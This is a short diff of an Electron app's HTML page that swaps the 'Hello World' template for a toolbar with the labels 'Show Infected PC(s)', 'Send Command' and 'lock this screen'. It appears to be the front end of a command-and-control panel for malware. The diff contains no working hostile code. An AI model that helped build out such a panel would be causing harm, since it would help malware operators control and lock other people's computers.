@@ -2,12 +2,28 @@
 <html>
   <head>
     <meta charset="UTF-8">
+    <link rel="stylesheet" href="./Css/materialize.min.css">
+    <link rel="stylesheet" href="./Css/font-awesome.min.css">
+    <link rel="stylesheet" href="./Css/main.css">
     <title>Hello World!</title>
   </head>
   <body>
-    <h1>Hello World!</h1>
-    We are using node <script>document.write(process.versions.node)</script>,
-    Chrome <script>document.write(process.versions.chrome)</script>,
-    and Electron <script>document.write(process.versions.electron)</script>.
+
+    <div class="fixed-action-btn toolbar">
+      <a class="btn-floating btn-large red">
+        <i class="large fa fa-bars"></i>
+      </a>
+      <ul>
+        <li class="waves-effect waves-light tooltipped grey darken-4" data-position="top" data-delay="50" data-tooltip="Show Infected PC(s)"><a href="#!"><i class="fa fa-desktop"></i></a></li>
+        <li class="waves-effect waves-light tooltipped grey darken-4" data-position="top" data-delay="50" data-tooltip="Send Command"><a href="#!"><i class="fa fa-terminal"></i></a></li>
+        <li class="waves-effect waves-light tooltipped" data-position="top" data-delay="50" data-tooltip="lock this screen"><a href="#!"><i class="fa fa-lock"></i></a></li>
+      </ul>
+    </div>
+
+      <script>if (typeof module === 'object') {window.module = module; module = undefined;}</script>
+      <script src="./Js/jquery-3.2.1.min.js" charset="utf-8"></script>
+      <script src="./Js/materialize.min.js" charset="utf-8"></script>
+      <script src="./Js/main.js" charset="utf-8"></script>
+      <script>if (window.module) module = window.module;</script>
   </body>
 </html>
